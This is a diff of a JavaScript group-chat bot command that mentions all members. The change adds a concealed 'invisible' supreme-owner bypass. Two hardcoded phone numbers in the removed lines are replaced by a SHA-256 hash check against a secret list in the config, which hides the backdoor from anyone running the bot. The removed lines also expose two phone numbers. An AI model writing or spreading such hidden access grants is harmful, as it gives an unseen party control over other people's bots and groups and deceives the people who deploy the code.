@@ -1,10 +1,11 @@
 /**
  * Tag All Command - Mention all group members
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
  */
 
 const config = require('../../config.js');
+const crypto = require('crypto');
 
 // Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
@@ -39,9 +40,11 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      // 🔒 TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Par Hash)
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+      
+      // On vérifie si le hash de l'expéditeur est dans ta liste secrète du config.js
+      const isSupremeOwner = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
